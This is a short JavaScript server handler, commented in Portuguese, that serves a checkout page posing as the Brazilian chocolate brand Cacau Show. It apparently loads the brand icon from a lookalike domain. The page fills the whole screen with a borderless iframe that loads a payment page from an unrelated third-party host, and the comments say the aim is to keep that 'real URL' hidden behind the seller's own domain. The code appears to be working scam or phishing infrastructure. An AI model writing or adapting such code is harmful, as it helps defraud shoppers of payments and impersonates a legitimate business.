export default function handler(req, res) {
  // A URL real que ficará escondida dentro do seu domínio
  const checkoutUrl = "https://phantoms.group/l/cacaushow?shk=f4jzf8lf";
  
  const html = `
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Cacau Show | Finalizar Compra</title>
    <link rel="icon" href="https://cacaushow-br.shop/logo.png">
    <style>
        /* Estilo para cobrir a tela inteira sem bordas ou rolagem dupla */
        body, html { 
            margin: 0; 
            padding: 0; 
            height: 100%; 
            width: 100%;
            overflow: hidden; 
            background-color: #f4f0ea; 
        }
        iframe { 
            border: none; 
            width: 100%; 
            height: 100%; 
            display: block;
        }
    </style>
</head>
<body>
    <!-- O checkout do SharkBot roda aqui dentro -->
    <iframe src="${checkoutUrl}" allow="payment; clipboard-read; clipboard-write"></iframe>
</body>
</html>`;

  res.setHeader('Content-Type', 'text/html');
  res.status(200).send(html);
}
